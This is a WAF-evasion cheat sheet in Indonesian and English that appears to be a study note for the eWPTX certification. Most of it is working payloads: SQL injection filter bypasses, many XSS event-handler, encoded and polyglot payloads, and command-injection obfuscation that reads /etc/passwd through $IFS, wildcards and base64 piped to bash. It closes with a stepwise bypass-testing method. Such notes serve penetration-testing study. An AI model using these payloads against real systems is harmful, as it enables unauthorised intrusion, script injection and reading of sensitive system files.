2026-02-06

Status:

Tags: [[eWPTX]] [[Bypassing Filters & Evasion]]
###### Prasyarat: [[Encoding & Transformation Bypasses]]
# Payload & Teknik Bypass WAF

## Bypass WAF untuk SQL Injection

### Inline comments

```sql
-- MySQL inline comments
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
UN/**/ION SE/**/LECT 1,2,3--

-- Bypass keyword detection
SEL%00ECT * FROM users
```

### Alternative syntax

```sql
-- UNION alternative using subquery
1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- No spaces (use parentheses)
UNION(SELECT(1),(2),(3))

-- Using LIKE instead of =
' OR username LIKE 'admin'--

-- Hex encoding values
' UNION SELECT * FROM users WHERE name=0x61646d696e--
```

### HTTP Parameter Pollution (HPP)

Kirim parameter yang sama berkali-kali — tiap server bisa memprosesnya berbeda:

```
# Apache: takes last value
# IIS/ASP: concatenates all values
# PHP: takes last value

?id=1&id=UNION&id=SELECT&id=1,2,3
```

### Chunked transfer

Bagi payload ke beberapa chunk agar tidak ada satu chunk yang memuat keyword utuh. Lihat [[Encoding & Transformation Bypasses]] untuk contohnya.

---

## Bypass WAF untuk XSS

### Alternative event handlers

```html
<!-- Common handlers that may not be filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
```

### SVG-based injection

```html
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
```

### JavaScript without parentheses

```html
<!-- Template literals -->
<img src=x onerror=alert`1`>

<!-- Using throw -->
<img src=x onerror="window.onerror=alert;throw 1">

<!-- location assignment -->
<img src=x onerror="location='javascript:alert(1)'">
```

### Encoding within attributes

```html
<!-- JavaScript hex escapes -->
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">

<!-- HTML entity in event handler (browser decodes before execution) -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Unicode escapes -->
<img src=x onerror="\u0061lert(1)">
```

### XSS polyglot

Satu payload yang bisa bekerja di banyak konteks:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## Bypass WAF untuk Command Injection

### Variable expansion (Linux)

```bash
# Using $IFS (Internal Field Separator) instead of spaces
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Using brace expansion
{cat,/etc/passwd}

# Using tabs
cat%09/etc/passwd
```

### String concatenation

```bash
# Concatenation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Env variable insertion
/???/??t /???/p??s?d
# Matches: /bin/cat /etc/passwd
```

### Base64 decode execution

```bash
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# Decodes to: cat /etc/passwd

$(echo "d2hvYW1p" | base64 -d)
# Decodes to: whoami
```

### Alternative command separators

```bash
# Standard
; whoami
| whoami
|| whoami
& whoami
&& whoami

# Newline
%0a whoami

# Backtick substitution
`whoami`
$(whoami)
```

---

## Teknik umum

### Request method switching

Beberapa WAF hanya inspeksi body POST, tidak GET atau PUT:

```bash
# If POST is filtered, try PUT
curl -X PUT "https://target.com/api" -d "id=1' OR 1=1--"
```

### Parameter name tricks

```
# Add brackets or encoding to parameter names
id[]=1' UNION SELECT 1--
%69%64=1' UNION SELECT 1--
```

### Multipart boundary tricks

```http
Content-Type: multipart/form-data; boundary=----
Content-Type: multipart/form-data; boundary=----; charset=utf-7
```

---

## Pendekatan pengujian

1. Identifikasi apa yang diblok (keyword/pola apa)
2. Tentukan filter memeriksa di mana (header, body, URL, nama parameter)
3. Mulai dari bypass encoding yang sederhana
4. Naikkan ke perubahan struktur (HPP, chunked, method switching)
5. Kombinasikan beberapa teknik
6. Dokumentasikan yang berhasil untuk target tersebut

Catatan: lakukan satu perubahan per percobaan agar mudah mengisolasi penyebab “lolos/blok”.
